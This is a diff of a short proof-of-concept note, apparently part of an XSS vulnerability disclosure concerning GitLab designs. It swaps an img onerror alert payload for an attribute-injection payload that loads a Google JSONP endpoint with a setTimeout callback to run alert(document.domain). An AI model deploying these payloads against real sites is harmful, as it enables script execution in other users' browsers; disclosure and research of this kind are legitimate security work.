@@ -17,4 +17,9 @@ POC :
 
 https://github.com/Trinity-SYT-SECURITY/XSS_vuln_issue/assets/96654161/568dc4df-ab68-4d58-bb00-b9b515a830da
 
-`<p x="`<img src=x onerror=alert(1)>"></p>
+<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>  
+' data-design="1" data-issue="1" data-reference-type="design" data-original="  
+  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>  
+"
+</a>  
+
